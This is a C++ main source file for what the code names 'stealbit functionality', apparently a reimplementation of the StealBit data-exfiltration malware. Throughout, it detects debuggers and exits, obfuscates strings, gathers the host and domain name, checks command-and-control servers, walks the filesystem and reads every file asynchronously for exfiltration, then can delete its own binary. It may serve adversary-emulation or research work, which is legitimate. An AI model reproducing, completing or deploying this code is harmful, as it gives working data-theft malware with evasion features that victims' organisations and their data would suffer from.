#include "main.hpp"
#include "networking.hpp"
#include "nt.hpp"
#include <format>

// to enable stdout logging in plaintext
#define DEBUG_LOGGING true

int main(int argc, char* argv[]) {

    // Initialize logger in debug mode to enable plaintext stdout logging
    int init_result = XorLogger::InitializeLogger(XOR_LIT("stb.log"), settings::key);
    if (init_result != 0) {
        std::cerr << XOR_LIT("Failed to initialize logger. Error code: ") << init_result << std::endl;
        return init_result;
    }
    XorLogger::LogInfo(XOR_LIT("Initialized Logger."));

    // Debugger check
    XorLogger::LogInfo(XOR_LIT("Checking if debugger is present"));
    if (evasion::IsProcessBeingDebugged()) {
        XorLogger::LogInfo(XOR_LIT("Debugger found. Exiting Application"));
        exit(-1);
    }
    XorLogger::LogInfo(XOR_LIT("No Debugger found."));

    // init config
    XorLogger::LogInfo(XOR_LIT("Reading config: ") + settings::config_path);
    if (!util::ReadParseConfig())
        exit(-1);

    // handle args
    arguments::InitArgs(argc, argv);
    XorLogger::LogDebug(XOR_LIT("Starting file/folder: ") + arguments::startingPoint);

    // begin actual stealbit functionality
    errorhandling::SetHardErrorMode();
    settings::environment::computerName = recon::GetSystemComputerName();
    settings::environment::domainName = recon::GetSystemDomainName();

    // verify we have c2 before we do any CPU intensive work.
    network::utilities::ValidateC2Servers();

    if (settings::C2_SERVERS.size() > 0) {
        
        std::vector<std::string> files = enumerate::EnumerateFilesystemPath(arguments::startingPoint);
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Starting IOCP Process for number of files:"), files.size()));

        // create completion port
        HANDLE hCompletionPort = IO::CreateIOCP();
        if (hCompletionPort == nullptr)
            return -1;

        // loop async read
        for (const auto& filePath : files)
        {
            if (IO::StartAsyncRead(filePath, hCompletionPort)) {
                 // On successful read, increment number of files to process
                IO::opsRemaining.fetch_add(1, std::memory_order_relaxed);
            }
        }
        
        while (IO::opsRemaining.load(std::memory_order_relaxed) > 0)
        {
            // loop process completion port until all files are done
            IO::ProcessIoCompletionPort(hCompletionPort, IO::opsRemaining);
        }

        // cleanup
        XorLogger::LogDebug(XOR_LIT("Closing completion port handle."));
        CloseHandle(hCompletionPort);
    }
    else {
        XorLogger::LogDebug(XOR_LIT("No C2 servers alive."));
    }

    if (arguments::selfDelete) {
        XorLogger::LogInfo(XOR_LIT("Self-delete enable - Removing existing binary."));
        evasion::DeleteApplicationImageAfterExecution();
    }

    return 0;
}